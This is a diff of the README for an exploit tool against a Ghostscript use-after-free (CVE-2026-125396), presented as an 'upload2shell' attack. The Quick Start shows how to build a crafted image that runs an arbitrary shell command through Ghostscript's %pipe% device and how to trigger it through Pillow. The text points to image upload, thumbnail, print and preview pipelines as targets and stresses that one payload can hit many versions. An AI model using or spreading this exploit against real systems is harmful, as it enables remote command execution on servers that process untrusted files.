@@ -1,4 +1,4 @@
-# CVE-2026-125396 Fuzz Bomb Exploit
+# CVE-2026-125396 bomb fuzz exploit
 
 [English](README_EN.md) | [中文](README.md)
 
@@ -6,25 +6,18 @@
 
 **Scope**: Ghostscript < 10.08.0
 
-A fuzzing-enabled upload2shell variant for 64-bit LP64; other architectures are
-not covered.
+A fuzzing-enabled version of upload2shell; supports fuzzing on 64-bit LP64, other architectures are not covered.
 
-## TL;DR
+# TL;DR
 
-This is a logical UAF. The UAF stage is address-independent: the payload uses a
-marker scan instead of guessing heap addresses, so a single prebuilt fuzz image
-can exercise many builds at once. The native RCE stage still depends on
-build-specific pointer offsets and heap phase, so validate each target. This is
-closer to the intended upload2shell concept.
+This is a logical UAF, address-independent, so you can prebuild a fuzz image that can fuzz a large number of versions at once. That is what makes it a bit like 24shell.
 
-In the spirit of Log4j-style parser gadgets: image/document uploads, thumbnails,
-print jobs, and preview/import pipelines that pass untrusted bytes to
-Ghostscript are the test surfaces.
+Similar to the Log4j approach: image/document uploads, thumbnails, printing, preview/import, etc. are all fuzz surfaces; if the backend uses Ghostscript, it can be hit.
 
 ## Quick Start
 
 ```bash
-# Generate the fuzz image: --cmd sets the %pipe% command; quoting prevents the shell from treating > as redirection
+# Generate the fuzz image: --cmd controls the %pipe% command; quote it to prevent the shell from treating > as redirection
 python3 exp.py --cmd 'id>/tmp/PWN' --out /tmp/exp.png
 
 # Load and trigger
@@ -33,12 +26,8 @@ with Image.open("/tmp/exp.png") as image:
     image.load()' | python3
 
 cat /tmp/PWN
-# uid=1000(debian) gid=1000(debian) ...
+# uid=1000(debian) gid=1000(debian) ....
 ```
-
-Pillow's EPS plugin invokes `gs` with `-dSAFER`. Because the payload writes
-`/tmp/PWN` and then `quit`s, `image.load()` may raise
-`UnidentifiedImageError`; `cat /tmp/PWN` still reads the `id` artifact.
 
 ---
 
